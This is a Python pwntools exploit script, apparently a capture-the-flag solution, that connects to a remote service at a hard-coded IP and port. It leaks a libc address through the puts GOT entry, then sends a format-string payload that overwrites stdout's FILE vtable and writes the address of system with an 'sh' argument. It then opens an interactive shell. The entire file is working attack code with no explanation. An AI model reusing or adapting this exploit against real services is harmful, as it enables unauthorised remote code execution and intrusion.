#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "202.120.7.210"
port = 12321 

r = remote(host,port)

r.recvuntil(":")
puts_got = 0x8049fdc
r.sendline(str(puts_got))
r.recvuntil("\n")
data = r.recvuntil("\n").strip()
puts_addr = int(data,16)
#libc = puts_addr - 0x5fca0
libc = puts_addr - 0x064da0
print hex(libc)
vtable = 0x804a530
#exit_func = libc + 0x1ee950 + 4
#exit_func = libc + 0x1b2df4
stdout = libc + 0x01a9ac0+0x94 
r.recvuntil("Bye")
system = libc + 0x003e3e0
#system = libc + 0x3ada0 
#system = libc + 0x12036c
#system = libc + 0xb0670
#system = libc + 0x5fbbe
#system = 0x41414141
#arg = libc + 0x1b2d60
arg = libc + 0x001a9ac0
payload = p32(vtable+0x1c)
#payload += p32(vtable+1+0x1c)
payload += p32(vtable+2+0x1c)
#payload += p32(vtable+3+0x1c)
payload += p32(stdout)
payload += p32(stdout+1)
payload += p32(stdout+2)
payload += p32(stdout+3)
payload += p32(arg)
payload += p32(arg+1)
payload += p32(arg+2)
sh = u32("sh\x00\x00")
prev = 4*9
for i in range(2):
    payload += fmtchar(prev,(system >> i*16) & 0xffff,7+i,2)
    prev = (system >> i*16) & 0xffff

prev = prev & 0xff
for i in range(4):
    payload += fmtchar(prev,(vtable >> i*8) & 0xff,7+i+2)
    prev = (vtable >> i*8) & 0xff

for i in range(3):
    payload += fmtchar(prev,(sh >> i*8) & 0xff,7+i+4+2)
    prev = (sh >> i*8) & 0xff

r.sendline(payload)
r.interactive()
